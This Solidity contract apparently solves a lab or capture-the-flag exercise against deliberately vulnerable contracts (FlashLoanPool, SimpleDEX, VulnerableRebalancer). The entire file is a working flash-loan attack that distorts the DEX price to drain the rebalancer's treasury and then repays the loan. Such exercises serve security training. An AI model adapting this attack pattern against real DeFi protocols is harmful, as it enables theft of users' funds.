// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./FlashLoanPool.sol";
import "./SimpleDEX.sol";
import "./VulnerableRebalancer.sol";

contract C3 {
	IERC20 public tokenA;
	IERC20 public tokenB;
	FlashLoanPool public flashLoanPool;
	SimpleDEX public dex;
	VulnerableRebalancer public rebalancer;

    constructor(address _tokenA, address _tokenB, address _flashLoanPool, address _dex, address _rebalancer) {
		tokenA = IERC20(_tokenA);
		tokenB = IERC20(_tokenB);
		flashLoanPool = FlashLoanPool(_flashLoanPool);
		dex = SimpleDEX(_dex);
        rebalancer = VulnerableRebalancer(_rebalancer);
	}

    function rebalanceAttack() public {
		uint256 totalPoolTokenA = tokenA.balanceOf(address(flashLoanPool));
		uint256 amount = (totalPoolTokenA * 80) / 100;

		flashLoanPool.flashLoan(address(tokenA), amount, "0x0");
    }

    function onFlashLoan(address token, uint256 amount, bytes calldata data) external {
        tokenA.approve(address(dex), amount);
        dex.swap(address(tokenA), amount);

        uint256 treasuryA = rebalancer.treasuryA();
        uint256 amountIn = treasuryA * rebalancer.getPrice() / 1e18;
        tokenB.approve(address(rebalancer), amountIn);
        rebalancer.swapBForA(amountIn);

        uint256 amountB2A = tokenB.balanceOf(address(this));
        tokenB.approve(address(dex), amountB2A);
        dex.swap(address(tokenB), amountB2A);
        tokenA.transfer(address(flashLoanPool), amount);
    }
}